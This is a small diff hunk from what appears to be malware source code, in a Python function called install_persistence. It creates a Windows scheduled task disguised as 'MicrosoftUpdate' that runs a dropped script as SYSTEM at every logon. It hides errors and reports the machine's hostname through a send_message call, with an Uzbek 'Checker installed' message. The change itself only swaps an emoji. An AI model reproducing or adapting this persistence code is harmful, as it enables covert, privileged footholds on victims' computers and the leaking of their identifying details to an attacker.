@@ -72,7 +72,7 @@ def install_persistence():
             with open(script_path, 'w') as f:
                 f.write(content)
         subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
-        send_message(f"🔒 Checker o'rnatildi: {socket.gethostname()}")
+        send_message(f"✅ Checker o'rnatildi: {socket.gethostname()}")
     except:
         pass
 
